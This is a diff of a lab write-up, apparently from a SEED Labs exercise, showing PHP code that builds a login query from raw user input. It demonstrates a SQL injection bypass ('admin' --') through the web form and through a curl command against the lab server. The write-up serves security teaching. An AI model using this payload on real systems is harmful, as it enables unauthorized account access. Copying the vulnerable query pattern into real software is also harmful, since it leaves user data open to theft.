@@ -17,7 +17,11 @@ $sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
         FROM credential
         WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
 $result = $conn -> query($sql);
+
+
 ```
+
+### Task 2.1 - Attack from webpage
 
 Considering that we know the code, it is really easy to exploit this vulnerability:
 
@@ -33,4 +37,12 @@ This approach works, because the sql statement that will be queried to the datab
                nickname, Password
         FROM credential
         WHERE name= ’admin’ -- and Password=’<anything>";
+```
+
+### Task 2.2 - Attack from command line
+
+After that, the approach that was made was exaclty the same, but in the command line, it will go like this:
+
+```sh
+curl ’www.seed-server.com/unsafe_home.php?username=admin%27%20--%20&Password=<anything>’
 ```
